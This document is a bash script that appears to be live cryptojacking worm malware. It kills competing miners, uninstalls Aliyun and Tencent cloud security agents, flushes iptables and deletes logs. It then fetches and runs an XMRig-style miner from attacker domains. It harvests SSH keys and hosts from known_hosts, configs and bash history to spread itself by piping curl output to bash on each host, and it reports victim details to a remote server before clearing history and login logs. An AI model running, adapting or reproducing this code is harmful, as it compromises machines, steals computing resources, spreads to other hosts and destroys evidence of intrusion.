#/bin/bash
apt-get install -y nc && yum install -y nc
processes(){
 killme() {
   killall -9 chron-34e2fg;ps wx|awk '/34e|r\/v3|moy5|defunct/' | awk '{print $1}' | xargs kill -9 & > /dev/null &
 }

 killa() {
 what=$1;ps auxw|awk "/$what/" |awk '!/awk/' | awk '{print $2}'|xargs kill -9&>/dev/null&
 }

 killa 34e2fg
 killme

 killall \.Historys
 killall \.sshd
 killall neptune
 killall xm64
 killall xm32
 killall xmrig
 killall \.xmrig
 killall suppoieup

 pkill -f sourplum
 pkill wnTKYg && pkill ddg* && rm -rf /tmp/ddg* && rm -rf /tmp/wnTKYg
 
 ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
 ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
 ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
 ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9
 ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
 ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9
 ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9
 ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
 ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
 ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9
 ps auxf|grep -v grep|grep "xmrig" | awk '{print $2}'|xargs kill -9
 ps auxf|grep -v grep|grep "xmrigDaemon" | awk '{print $2}'|xargs kill -9
 ps auxf|grep -v grep|grep "xmrigMiner" | awk '{print $2}'|xargs kill -9
 ps auxf|grep -v grep|grep "/var/tmp/java" | awk '{print $2}'|xargs kill -9
 ps auxf|grep -v grep|grep "ddgs" | awk '{print $2}'|xargs kill -9
 ps auxf|grep -v grep|grep "qW3xT" | awk '{print $2}'|xargs kill -9
 ps auxf|grep -v grep|grep "t00ls.ru" | awk '{print $2}'|xargs kill -9
 ps auxf|grep -v grep|grep "/var/tmp/sustes" | awk '{print $2}'|xargs kill -9
 
 ps -ef|grep -v grep|grep hwlh3wlh44lh|awk '{print $2}'|xargs kill -9
 ps -ef|grep -v grep|grep Circle_MI|awk '{print $2}'|xargs kill -9
 ps -ef|grep -v grep|grep get.bi-chi.com|awk '{print $2}'|xargs kill -9
 ps -ef|grep -v grep|grep hashvault.pro|awk '{print $2}'|xargs kill -9
 ps -ef|grep -v grep|grep nanopool.org|awk '{print $2}'|xargs kill -9
 ps -ef|grep -v grep|grep /usr/bin/.sshd|awk '{print $2}'|xargs kill -9
 ps -ef|grep -v grep|grep /usr/bin/bsd-port|awk '{print $2}'|xargs kill -9
 ps -ef|grep -v grep|grep "xmr"|awk '{print $2}'|xargs kill -9
 ps -ef|grep -v grep|grep "xig"|awk '{print $2}'|xargs kill -9
 ps -ef|grep -v grep|grep "ddgs"|awk '{print $2}'|xargs kill -9
 ps -ef|grep -v grep|grep "qW3xT"|awk '{print $2}'|xargs kill -9
 ps -ef|grep -v grep|grep "wnTKYg"|awk '{print $2}'|xargs kill -9
 ps -ef|grep -v grep|grep "t00ls.ru"|awk '{print $2}'|xargs kill -9
 ps -ef|grep -v grep|grep "sustes"|awk '{print $2}'|xargs kill -9
 ps -ef|grep -v grep|grep "thisxxs"|awk '{print $2}' | xargs kill -9
 ps -ef|grep -v grep|grep "hashfish"|awk '{print $2}'|xargs kill -9
 ps -ef|grep -v grep|grep "kworkerds"|awk '{print $2}'|xargs kill -9

 ps auxf|grep xiaoyao| awk '{print $2}'|xargs kill -9
 ps auxf|grep named| awk '{print $2}'|xargs kill -9
 ps auxf|grep kernelcfg| awk '{print $2}'|xargs kill -9
 ps auxf|grep xiaoxue| awk '{print $2}'|xargs kill -9
 ps auxf|grep kernelupgrade| awk '{print $2}'|xargs kill -9
 ps auxf|grep kernelorg| awk '{print $2}'|xargs kill -9
 ps auxf|grep kernelupdates| awk '{print $2}'|xargs kill -9

 ps ax|grep var|grep lib|grep jenkins|grep -v httpPort|grep -v headless|grep "\-c"|xargs kill -9
 ps ax|grep -o './[0-9]* -c'| xargs pkill -f

 pkill -f /usr/bin/.sshd
 pkill -f acpid
 pkill -f AnXqV.yam
 pkill -f apaceha
 pkill -f askdljlqw
 pkill -f bashe
 pkill -f bashf
 pkill -f bashg
 pkill -f bashh
 pkill -f bashx
 pkill -f BI5zj
 pkill -f biosetjenkins
 pkill -f bonn.sh
 pkill -f bonns
 pkill -f conn.sh
 pkill -f conns
 pkill -f cryptonight
 pkill -f crypto-pool
 pkill -f ddg.2011
 pkill -f deamon
 pkill -f disk_genius
 pkill -f donns
 pkill -f Duck.sh
 pkill -f gddr
 pkill -f Guard.sh
 pkill -f i586
 pkill -f icb5o
 pkill -f ir29xc1
 pkill -f irqba2anc1
 pkill -f irqba5xnc1
 pkill -f irqbalanc1
 pkill -f irqbalance
 pkill -f irqbnc1
 pkill -f JnKihGjn
 pkill -f jweri
 pkill -f kw.sh
 pkill -f kworker34
 pkill -f kxjd
 pkill -f libapache
 pkill -f Loopback
 pkill -f lx26
 pkill -f mgwsl
 pkill -f minerd
 pkill -f minergate
 pkill -f minexmr
 pkill -f mixnerdx
 pkill -f mstxmr
 pkill -f nanoWatch
 pkill -f nopxi
 pkill -f NXLAi
 pkill -f performedl
 pkill -f polkitd
 pkill -f pro.sh
 pkill -f pythno
 pkill -f qW3xT.2
 pkill -f sourplum
 pkill -f stratum
 pkill -f sustes
 pkill -f wnTKYg
 pkill -f XbashY
 pkill -f XJnRj
 pkill -f xmrig
 pkill -f xmrigDaemon
 pkill -f xmrigMiner
 pkill -f ysaydh
 pkill -f zigw
    pkill -f pastebin
    pkill -f 185.193.127.115
 
 # crond
 ps ax | grep crond | grep -v grep | awk '{print $1}' > /tmp/crondpid
 while read crondpid
 do
  if [ $(echo  $(ps -p $crondpid -o %cpu | grep -v \%CPU) | sed -e 's/\.[0-9]*//g')  -ge 60 ]
  then
   kill $crondpid
   rm -rf /var/tmp/v3
  fi
 done < /tmp/crondpid
 rm /tmp/crondpid -f
  
 # sshd
 ps ax | grep sshd | grep -v grep | awk '{print $1}' > /tmp/ssdpid
 while read sshdpid
 do
  if [ $(echo  $(ps -p $sshdpid -o %cpu | grep -v \%CPU) | sed -e 's/\.[0-9]*//g')  -ge 60 ]
  then
   kill $sshdpid
  fi
 done < /tmp/ssdpid
 rm -f /tmp/ssdpid

 # syslog
 ps ax | grep syslogs | grep -v grep | awk '{print $1}' > /tmp/syslogspid
 while read syslogpid
 do
  if [ $(echo  $(ps -p $syslogpid -o %cpu | grep -v \%CPU) | sed -e 's/\.[0-9]*//g')  -ge 60 ]
  then
   kill  $syslogpid
  fi
 done < /tmp/syslogspid
 rm /tmp/syslogspid -f

    ps x | grep 'b 22'| awk '{print $1,$5}' > .procs

    cat .procs | while read line
    do

    pid=`echo $line | awk '{print $1;}'`
    name=`echo $line | awk '{print $2;}'`
    #echo $pid $name 

    if [ $(echo $name | wc -c) -lt "13" ]
        then
        echo "Found" $pid $name
        kill -9 $pid
    fi
    done

    ####################################################


    ps x | grep 'd 22'| awk '{print $1,$5}' > .procs

    cat .procs | while read line
    do

    pid=`echo $line | awk '{print $1;}'`
    name=`echo $line | awk '{print $2;}'`
    #echo $pid $name 

    if [ $(echo $name | wc -c) -lt "13" ]
        then
        echo "Found" $pid $name
        kill -9 $pid
    fi
    done
    
    if ps aux | grep -i '[a]liyun'; then
      curl http://update.aegis.aliyun.com/download/uninstall.sh | bash
      curl http://update.aegis.aliyun.com/download/quartz_uninstall.sh | bash
      pkill aliyun-service
      rm -rf /etc/init.d/agentwatch /usr/sbin/aliyun-service
      rm -rf /usr/local/aegis*
      systemctl stop aliyun.service
      systemctl disable aliyun.service
      service bcm-agent stop
      yum remove bcm-agent -y
      apt-get remove bcm-agent -y
    elif ps aux | grep -i '[y]unjing'; then
      /usr/local/qcloud/stargate/admin/uninstall.sh
      /usr/local/qcloud/YunJing/uninst.sh
      /usr/local/qcloud/monitor/barad/admin/uninstall.sh
    fi
}

# Removing miners by known path IOC
files(){
    ulimit -n 65535
    rm -rf /var/log/syslog
    chattr -iua /tmp/
    chattr -iua /var/tmp/
    chattr -R -i /var/spool/cron
    chattr -i /etc/crontab
    ufw disable
    iptables -F
    echo "nope" >/tmp/log_rot
    sysctl kernel.nmi_watchdog=0
    echo '0' >/proc/sys/kernel/nmi_watchdog
    echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf
 rm /tmp/.cron
 rm /tmp/.main
 rm /tmp/.yam* -rf
 rm -f /tmp/irq
 rm -f /tmp/irq.sh
 rm -f /tmp/irqbalanc1
 rm -rf /boot/grub/deamon && rm -rf /boot/grub/disk_genius
 rm -rf /tmp/*httpd.conf
 rm -rf /tmp/*httpd.conf*
 rm -rf /tmp/*index_bak*
 rm -rf /tmp/.systemd-private-*
 rm -rf /tmp/.xm*
 rm -rf /tmp/a7b104c270
 rm -rf /tmp/conn
 rm -rf /tmp/conns
 rm -rf /tmp/httpd.conf
 rm -rf /tmp/java*
 rm -rf /tmp/kworkerds /bin/kworkerds /bin/config.json /var/tmp/kworkerds /var/tmp/config.json /usr/local/lib/libjdk.so
 rm -rf /tmp/qW3xT.2 /tmp/ddgs.3013 /tmp/ddgs.3012 /tmp/wnTKYg /tmp/2t3ik
 rm -rf /tmp/root.sh /tmp/pools.txt /tmp/libapache /tmp/config.json /tmp/bashf /tmp/bashg /tmp/libapache
 rm -rf /tmp/xm*
 rm -rf /var/tmp/java*
}

# Killing and blocking miners by network related IOC
network(){
 # Kill by known ports/IPs
 netstat -anp | grep 69.28.55.86:443 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
 netstat -anp | grep 185.71.65.238 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
 netstat -anp | grep 140.82.52.87 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
    netstat -antp | grep '46.243.253.15' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
    netstat -antp | grep '176.31.6.16' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
    netstat -antp | grep '108.174.197.76' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
    netstat -antp | grep '192.236.161.6' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
    netstat -antp | grep '88.99.242.92' | grep 'ESTABLISHED\|SYN_SENT' | awk '{print $7}' | sed -e "s/\/.*//g" | xargs -I % kill -9 %
    netstat -nap | grep -E "103.145.106.158:443|103.246.218.179:6502|104.244.76.93:1454|104.248.121.36:445|104.248.61.120:443|107.167.67.3:13782|107.167.67.4:13782|107.167.67.5:13782|117.34.112.207:1235|138.68.128.111:445|138.68.130.218:1433|138.68.130.218:445|138.68.142.13:445|138.68.142.92:445|138.68.230.92:443|138.68.246.34:445|139.162.109.72:443|139.177.196.162:443|139.59.121.156:445|139.59.126.17:445|139.59.15.109:445|139.59.179.101:445|139.59.7.113:445|139.59.9.111:445|139.59.99.194:445|139.99.101.232:14444|139.99.102.70:14444|14.18.234.70:1230|142.44.242.100:14444|144.217.14.109:14444|144.217.14.139:14444|151.80.144.188:14433|151.80.144.188:14444|159.203.163.234:445|165.227.160.93:445|165.227.161.212:445|165.227.173.38:445|165.227.18.2:445|165.227.31.28:445|165.227.88.205:445|176.118.208.39:1188|178.128.242.134:3333|185.10.68.123:443|185.221.134.226:443|188.166.127.22:443|188.166.37.82:445|190.79.185.110:59515|192.99.69.170:14444|20.189.97.24:64536|202.75.212.134:1982|205.185.119.77:1982|207.246.100.198:14444|212.178.135.62:8999|213.32.74.157:14444|217.112.162.113:445|27.102.114.202:443|39.104.101.170:6688|39.104.23.125:6688|39.99.54.0:6688|45.154.252.109:50002|45.32.71.82:14444|45.56.98.229:42952|45.58.188.38:80|45.86.67.26:443|46.101.249.34:445|46.101.58.219:443|50.116.32.12:443|51.15.54.102:14433|51.15.55.100:14444|51.15.55.162:14444|51.15.58.224:14433|51.15.58.224:14444|51.15.65.182:14433|51.15.67.17:14444|51.15.69.136:14433|51.15.69.136:14444|51.15.78.68:14433|51.15.78.68:14444|51.255.34.118:14444|51.255.34.80:14444|51.83.33.228:14444|66.42.105.146:14444|8.130.27.3:9400" |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
} 

files
processes
network
echo "DONE"

if [ -f /root/.ssh/known_hosts ] && [ -f /root/.ssh/id_rsa.pub ]; then
  for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" /root/.ssh/known_hosts); do echo exit |nc -w 1 -n -v $h 65529 && ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'export src=sshcopy;(curl -fsSL http://t.bb3u9.com/ln/core.png?sshcopy*`whoami`*`hostname`||wget -q -O- http://t.bb3u9.com/ln/core.png?sshcopy*`whoami`*`hostname`)|bash >/dev/null 2>&1 &' & done
fi
if [ "`whoami`" ==  "root" ];then
    Xpath=/.Xl1
else
    Xpath=~/.Xl1
fi
if [ ! -d "$Xpath" ];then
 mkdir $Xpath
fi
cd $Xpath
if [ ! -f "./xr" ];then
 uname -a|grep x86_64 && (curl -fsSL d.u78wjdu.com/ln/xr.zip||wget -q -O- d.u78wjdu.com/ln/xr.zip)>xr.zip && tar xf xr.zip && rm xr.zip
fi
uname -a|grep x86_64 && ps aux|grep p.b69kq.com |grep -v grep || ./xr -o p.b69kq.com:444 --opencl --donate-level=1 --nicehash -B --http-host=0.0.0.0 --http-port=65529 --opencl --cuda

for file in /home/*
do
    if test -d $file; then
        if [ -f $file/.ssh/known_hosts ] && [ -f $file/.ssh/id_rsa.pub ]; then
            for h in $(grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" $file/.ssh/known_hosts); do echo exit |nc -w 1 -n -v $h 65529 && ssh -oBatchMode=yes -oConnectTimeout=5 -oStrictHostKeyChecking=no $h 'export src=sshcopy;(curl -fsSL http://t.bb3u9.com/ln/core.png?sshcopy*`whoami`*`hostname`||wget -q -O- http://t.bb3u9.com/ln/core.png?sshcopy*`whoami`*`hostname`)|bash >/dev/null 2>&1 &' & done
        fi
    fi
done

localgo() {
  myhostip=$(curl -sL icanhazip.com)
  KEYS=$(find ~/ /root /home -maxdepth 3 -name 'id_rsa*' | grep -vw pub)
  KEYS2=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep IdentityFile | awk -F "IdentityFile" '{print $2 }')
  KEYS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | awk -F ' -i ' '{print $2}' | awk '{print $1'})
  KEYS4=$(find ~/ /root /home -maxdepth 3 -name '*.pem' | uniq)
  HOSTS=$(cat ~/.ssh/config /home/*/.ssh/config /root/.ssh/config | grep HostName | awk -F "HostName" '{print $2}')
  HOSTS2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}")
  HOSTS3=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $2}' | awk -F '{print $1}')
  HOSTS4=$(cat /etc/hosts | grep -vw "0.0.0.0" | grep -vw "127.0.1.1" | grep -vw "127.0.0.1" | grep -vw $myhostip | sed -r '/\n/!s/[0-9.]+/\n&\n/;/^([0-9]{1,3}\.){3}[0-9]{1,3}\n/P;D' | awk '{print $1}')
  HOSTS5=$(cat ~/*/.ssh/known_hosts /home/*/.ssh/known_hosts /root/.ssh/known_hosts | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | uniq)
  HOSTS6=$(ps auxw | grep -oP "([0-9]{1,3}\.){3}[0-9]{1,3}" | grep ":22" | uniq)
  USERZ=$(
    echo "root"
    find ~/ /root /home -maxdepth 2 -name '\.ssh' | uniq | xargs find | awk '/id_rsa/' | awk -F'/' '{print $3}' | uniq
  )
  USERZ2=$(cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '@' '{print $1}' | awk '{print $4}' | uniq)
  pl=$(
    echo "22"
    cat ~/.bash_history /home/*/.bash_history /root/.bash_history | grep -vw "cp" | grep -vw "mv" | grep -vw "cd " | grep -vw "nano" | grep -v grep | grep -E "(ssh|scp)" | tr ':' ' ' | awk -F '-p' '{print $2}'
  )
  sshports=$(echo "$pl" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  userlist=$(echo "$USERZ $USERZ2" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  hostlist=$(echo "$HOSTS $HOSTS2 $HOSTS3 $HOSTS4 $HOSTS5 $HOSTS6" | grep -vw 127.0.0.1 | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  keylist=$(echo "$KEYS $KEYS2 $KEYS3 $KEYS4" | tr ' ' '\n' | nl | sort -u -k2 | sort -n | cut -f2-)
  i=0
  for user in $userlist; do
    for host in $hostlist; do
      for key in $keylist; do
        for sshp in $sshports; do
          i=$((i+1))
          if [ "${i}" -eq "20" ]; then
            sleep 20
            ps wx | grep "ssh -o" | awk '{print $1}' | xargs kill -9 &>/dev/null &
            i=0
          fi
          #Wait 20 seconds after every 20 attempts and clean up hanging processes

          chmod +r $key
          chmod 400 $key
          echo "$user@$host $key $sshp"
          echo exit |nc -w 1 -n -v $host 65529 &&  ssh -oStrictHostKeyChecking=no -oBatchMode=yes -oConnectTimeout=5 -i $key $user@$host -p$sshp "export src=sshcopy;(curl -fsSL http://t.bb3u9.com/ln/core.png?sshcopy*`whoami`*`hostname`||wget -q -O- http://t.bb3u9.com/ln/core.png?sshcopy*`whoami`*`hostname`)|bash >/dev/null 2>&1 &"
        done
      done
    done
  done
}
localgo

if [ ! -f /usr/bin/python ];then
pythonpath=/usr/bin/python3
else
pythonpath=/usr/bin/python
fi

function ispub(){
$pythonpath <<EOF
ips=(4026531840, 3758096384),(4026531840, 4026531840),(4278190080, 0),(4278190080, 167772160),(4278190080, 2130706432),(4290772992, 1681915904),(4293918720, 2886729728),(4294836224, 3323068416),(4294901760, 2851995648),(4294901760, 3232235520),(4294967040, 3221225472),(4294967040, 3221225984),(4294967040, 3227017984),(4294967040, 3325256704),(4294967040, 3405803776),(4294967295, 4294967295)
iplist=['161.35.107.193','66.42.43.37','167.99.154.202','139.162.80.221','128.199.183.160']
ip='$1'
iparr=ip.split(".")
iplong=0
iplong|=(int(iparr[0])*16777216)
iplong|=(int(iparr[1])*65536)
iplong|=(int(iparr[2])*256)
iplong|=int(iparr[3])
for j in range(len(ips)):
 if ip in iplist or iplong&ips[j][0] == ips[j][1]:
  print("false")
  break
else:
 print("true")
EOF
}
writeips="165.227.62.120|202.182.120.192|176.58.99.231|138.68.251.24|170.187.149.77|138.68.186.90"
for line in `netstat -nap|grep ESTABLISHED|grep -v -E "$writeips"|awk '{print $5":"$7}'|awk -F"/" '{print $1}'`; do 
 arr=(${line//:/ })
    echo ${arr[0]} ${arr[1]}
 ispub ${arr[0]}|grep true && echo 'GET / HTTP/1.1\n\n'|nc ${arr[0]} ${arr[1]} -w 5|grep HTTP/1 || echo '{"id":1,"jsonrpc":"2.0","method":"login","params":{"login":"x","pass":null,"agent":"XMRig/5.13.1","algo":["cn/1","cn/2","cn/r","cn/fast","cn/half","cn/xao","cn/rto","cn/rwz","cn/zls","cn/double","rx/0","rx/wow","rx/loki","rx/arq","rx/sfx","rx/keva"]}}\n'|nc ${arr[0]} ${arr[1]} -w 5|grep jsonrpc && (kill -STOP ${arr[2]} & iptables -A OUTPUT -d ${arr[0]} -j REJECT & curl "http://d.u78wjdu.com/rellik.json?ln_1&`whoami`&`hostname`&${arr[0]}&${arr[1]}")
done

sed 's/t.zer9g.com/t.bb3u9.com/g' /etc/crontab > /tmp/tmpfile1.txt && mv /tmp/tmpfile1.txt /etc/crontab
sed 's/t.amynx.com/t.bb3u9.com/g' /etc/crontab > /tmp/tmpfile1.txt && mv /tmp/tmpfile1.txt /etc/crontab
sed 's/lplp.ackng.com/p.b69kq.com/g' /etc/crontab > /tmp/tmpfile2.txt && mv /tmp/tmpfile2.txt /etc/crontab

crontab -l | sed '/update.sh/d' | crontab -
crontab -l | sed '/logo4/d' | crontab -
crontab -l | sed '/logo9/d' | crontab -
crontab -l | sed '/logo0/d' | crontab -
crontab -l | sed '/logo/d' | crontab -
crontab -l | sed '/tor2web/d' | crontab -
crontab -l | sed '/jpg/d' | crontab -
crontab -l | sed '/png/d' | crontab -
crontab -l | sed '/tmp/d' | crontab -
crontab -l | sed '/zmreplchkr/d' | crontab -
crontab -l | sed '/aliyun.one/d' | crontab -
crontab -l | sed '/3.215.110.66.one/d' | crontab -
crontab -l | sed '/pastebin/d' | crontab -
crontab -l | sed '/onion/d' | crontab -
crontab -l | sed '/lsd.systemten.org/d' | crontab -
crontab -l | sed '/shuf/d' | crontab -
crontab -l | sed '/ash/d' | crontab -
crontab -l | sed '/mr.sh/d' | crontab -
crontab -l | sed '/185.181.10.234/d' | crontab -
crontab -l | sed '/localhost.xyz/d' | crontab -
crontab -l | sed '/45.137.151.106/d' | crontab -
crontab -l | sed '/111.90.159.106/d' | crontab -
crontab -l | sed '/github/d' | crontab -
crontab -l | sed '/bigd1ck.com/d' | crontab -
crontab -l | sed '/xmr.ipzse.com/d' | crontab -
crontab -l | sed '/185.181.10.234/d' | crontab -
crontab -l | sed '/146.71.79.230/d' | crontab -
crontab -l | sed '/122.51.164.83/d' | crontab -
crontab -l | sed '/newdat.sh/d' | crontab -
crontab -l | sed '/93.189.43.3/d' | crontab -
crontab -l | sed '/update.sh/d' | crontab -

sleep 10
guid=`echo $(dmidecode -t 4 | grep ID | sed 's/.*ID://;s/ //g') $(ifconfig | grep -oP 'HWaddr \K.*'|sed 's/://g')|sha256sum|awk '{print $1}'`
mip=`$pythonpath -c "import json,urllib2;r=urllib2.urlopen('http://127.0.0.1:65529/1/summary');j=json.loads(r.read());print str(j['connection']['ip']).replace(' ','')"`
hashrate=`$pythonpath -c "import json,urllib2;r=urllib2.urlopen('http://127.0.0.1:65529/1/summary');j=json.loads(r.read());print str(j['hashrate']['total']).replace(' ','')"`
pyver=`$pythonpath -V 2>&1|awk '{print $2}'`
if [ -f /.dockerenv ];then
isdocker=1
else
isdocker=0
fi
if [ -f "$Xpath/xr" ];then
isxrfile=1
else
isxrfile=0
fi
reurl=http://t.bb3u9.com/ln/report.asp?*`whoami`*`hostname`*${guid}*${isdocker}*${pyver}*${isxrfile}*${hashrate}*${mip}
(curl -fsSL $reurl||wget -q -O- $reurl)|bash

history -c
echo 0>/var/spool/mail/root
echo 0>/var/log/wtmp
echo 0>/var/log/secure
echo 0>/var/log/cron
